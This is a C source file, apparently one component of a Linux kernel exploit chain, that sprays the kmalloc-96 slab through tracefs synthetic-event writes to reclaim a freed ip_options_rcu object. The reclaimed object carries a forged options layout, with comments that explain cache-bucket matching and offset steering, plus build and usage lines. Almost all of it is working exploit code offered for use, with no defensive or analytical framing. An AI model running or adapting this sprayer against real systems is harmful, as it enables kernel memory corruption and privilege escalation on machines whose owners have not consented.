/* synthspray.c - reclaim the freed ip_options_rcu via tracefs synthetic events.
 *
 * create_or_delete_synth_event (kernel/trace/trace_events_synth.c):
 *     check_command(raw_command);            // needs ">=3 words before ;"
 *     name = kmemdup_nul(raw_command, p - raw_command, GFP_KERNEL);
 *     ... __create_synth_event(name, fields) ...
 * free:
 *     kfree(name);                           // ALWAYS freed -> fast churn
 *
 * The first token (up to the first space) is copied verbatim into a fresh
 * kmalloc'd buffer. A token of 88 printable non-space bytes -> kmalloc-96
 * holding our exact fake ip_options_rcu layout (object = token, the
 * ip_options sits at object+16).
 *
 * The call site (create_or_delete_synth_event+0x95) must share the boot's
 * RANDOM_KMALLOC_CACHES bucket with tcp_v4_save_options; the run script
 * recomputes buckets per boot and selects the matching sprayer.
 *
 * Payload: fake ip_options with optlen=40 srr=67 rr=68 ts=69 flags=0x28;
 * faddr/nexthop are never read by ip_options_build (kept printable 'B'/'C'
 * to survive the token split). __data is copied into the packet verbatim
 * (filler) - the write offsets come from the ACK field (client ISN), not
 * from __data.
 *
 * Build: gcc -O2 -static -o synthspray synthspray.c
 * Usage: sudo ./synthspray <runtime_s> [cpu]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define SYNTH "/sys/kernel/debug/tracing/synthetic_events"
#define TOKLEN 88   /* kmemdup_nul(88) -> 89 bytes -> kmalloc-96 */

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    /* token == the object (object+0). fake ip_options_rcu:
     *   rcu_head  @ 0..15   filler
     *   faddr     @ 16..19  'BBBB' (unused by ip_options_build)
     *   nexthop   @ 20..23  'CCCC'
     *   optlen    @ 24      = 40  (0x28, '(')
     *   srr       @ 25      = 67  ('C')
     *   rr        @ 26      = 68  ('D')
     *   ts        @ 27      = 69  ('E')
     *   flags     @ 28      = 0x28 ('(') rr_needaddr|ts_needaddr
     *   pad       @ 29..31  'AAA'
     *   __data    @ 32..87  filler (offset aiming comes from the ACK field)
     */
    char tok[TOKLEN];
    memset(tok, 'D', sizeof(tok));
    memset(tok, 'A', 16);
    memcpy(tok + 16, "BBBBCCCC", 8);
    tok[24] = 0x28;    /* optlen = 40 */
    tok[25] = 67;      /* srr */
    tok[26] = 68;      /* rr  */
    tok[27] = 69;      /* ts  */
    tok[28] = 0x28;    /* flags */
    tok[29] = 'A'; tok[30] = 'A'; tok[31] = 'A';

    /* "<token> u32 a; u32 b" - passes check_command (argc>=3) */
    char cmd[TOKLEN + 32];
    memcpy(cmd, tok, TOKLEN);
    memcpy(cmd + TOKLEN, " u32 a; u32 b", 14);

    int fd = open(SYNTH, O_WRONLY);
    if (fd < 0) { perror(SYNTH); return 1; }

    unsigned long n = 0, err = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 256; i++) {
            ssize_t r = write(fd, cmd, TOKLEN + 13);
            if (r < 0) err++; else n++;
        }
    }
    close(fd);
    fprintf(stderr, "[synth] writes=%lu err=%lu\n", n, err);
    return 0;
}
